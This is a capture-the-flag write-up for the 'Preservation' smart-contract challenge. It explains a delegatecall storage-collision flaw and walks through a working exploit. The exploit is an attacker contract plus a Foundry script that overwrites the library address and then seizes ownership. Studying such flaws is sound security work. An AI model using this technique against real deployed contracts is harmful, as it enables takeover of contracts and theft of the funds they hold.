# Preservation   
Our goal in this challenge is to claim ownership of the `Preservation` contract. However, there’s no direct function to change the `owner`. Let’s analyze the setup.

The description mentions that a `library` is used to store two different times for two different timezones. Let’s take a look at the provided library:
```solidity
// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```
At first glance, this seems like a library, but it’s actually a contract. Libraries in Solidity cannot have state variables or hold ether, but this contract does. 
This discrepancy is key to solving the challenge. [https://solidity-by-example.org/library/](https://solidity-by-example.org/library/)

#### The Vulnerability: [Storage Collision](https://mixbytes.io/blog/collisions-solidity-storage-layouts)

The issue here lies in how `delegatecall` works. When `Preservation` uses `delegatecall` to interact with `LibraryContract`, it executes the library’s code in the context of the `Preservation` contract’s storage. This means that any storage writes in `LibraryContract` will affect Preservation’s storage slots.

Let’s compare the storage layouts of both contracts:

Preservation:
```solidity
address public timeZone1Library; // Slot 0
address public timeZone2Library; // Slot 1
address public owner;            // Slot 2
uint256 storedTime;              // Slot 3
```
LibraryContract:   
```solidity
uint256 storedTime; // Slot 0
```
Notice that `LibraryContract` only uses one storage slot (`storedTime`), but when `delegatecall` is used, this slot corresponds to `timeZone1Library` in `Preservation`. This misalignment allows us to manipulate Preservation’s storage.

#### Exploiting the Misalignment

By calling `setTime` in `LibraryContract`, we can overwrite `timeZone1Library` in `Preservation` because both share the same storage slot (Slot 0). Once we change `timeZone1Library` to point to a malicious contract, we can use it to modify the `owner` variable.  

Here’s the step-by-step plan:
1. Deploy a malicious contract with a setTime function that updates the owner.
2. Overwrite timeZone1Library to point to our malicious contract.
3. Call setFirstTime again to trigger the malicious setTime function and claim ownership.

I created a smart contract and a script to automate the process: 

Solving.sol:   
```solidity
//SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract Solving {

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _newOwner) public {
        owner = msg.sender; 
    }
}
```
SolvingScript.s.sol:   
```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {Solving} from "src/Solving.sol";

contract SolvingScript is Script {

    Solving solving;
    address victim = ; /* Your instance address */

    function run() public {
        vm.startBroadcast();

        // Step 1: Deploy our malicious smart contract
        solving = new Solving();

        // Step 2: Overwrite timeZone1Library with our malicious contract
        victim.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(uint160(address(solving)))));

        // Step 3: Trigger setTime in our contract to claim ownership
        victim.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(0)));
    }
}
```
